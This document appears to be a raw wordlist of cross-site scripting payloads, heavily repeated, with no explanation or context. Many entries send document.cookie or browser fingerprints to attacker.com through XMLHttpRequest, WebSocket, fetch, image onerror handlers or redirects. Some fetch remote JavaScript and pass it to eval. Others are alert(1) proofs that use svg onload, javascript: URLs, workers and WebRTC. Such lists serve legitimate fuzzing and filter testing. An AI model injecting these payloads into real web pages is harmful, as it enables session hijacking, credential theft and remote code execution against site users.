<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
